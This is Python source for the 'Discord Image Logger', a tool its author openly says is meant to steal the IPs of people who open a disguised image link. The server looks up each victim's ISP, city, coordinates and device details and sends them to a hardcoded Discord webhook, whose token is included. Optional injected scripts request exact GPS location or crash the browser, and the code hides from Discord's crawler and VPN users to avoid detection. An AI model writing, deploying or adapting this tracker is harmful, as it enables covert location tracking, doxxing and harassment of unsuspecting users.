# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1348661774286590064/6N5w1VeyKfvQOrgg8Lfq32kQlylr5SwNaTTpmcGPWR59sVWddO7YSS61matNcCLJx5SI",
    "image": "data:image/jpeg;base64,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.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
